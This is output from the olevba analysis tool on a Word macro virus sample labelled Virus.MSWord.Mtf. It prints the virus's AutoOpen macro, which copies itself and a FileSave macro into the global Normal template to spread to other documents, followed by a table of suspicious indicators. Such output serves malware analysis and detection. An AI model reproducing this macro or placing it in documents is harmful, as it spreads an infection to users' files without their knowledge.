olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mtf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mtf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Mtf - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Name_$
Dim MacAndTmp1$
Dim MacAndTmp2$
Name_$ = WordBasic.[FileName$](0)

MacAndTmp1$ = Name_$ + ":FileSave"
MacAndTmp2$ = Name_$ + ":AutoOpen"

On Error GoTo -1: On Error GoTo MyTrap      'Set up error trap
WordBasic.MacroCopy MacAndTmp1$, "Global:FileSave"
WordBasic.MacroCopy MacAndTmp2$, "Global:Mtf1"

GoTo Ends

MyTrap: 'for Russian version
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo Ends
WordBasic.MacroCopy MacAndTmp1$, "Normal:FileSave"
WordBasic.MacroCopy MacAndTmp2$, "Normal:Mtf1"

Ends:
On Error GoTo -1: On Error GoTo 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

